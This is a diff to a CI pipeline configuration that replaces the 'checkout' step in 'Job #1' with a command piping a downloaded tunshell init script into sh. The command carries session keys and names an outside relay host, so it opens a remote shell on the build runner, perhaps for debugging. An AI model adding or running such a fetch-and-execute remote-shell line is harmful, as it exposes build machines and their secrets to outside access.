@@ -10,4 +10,4 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - checkout
+            - 'curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T WHMnuS4HF66wbOVj9RegZc jgYDrjdNPa7pxnnhkt4D7d eu.relay.tunshell.com'
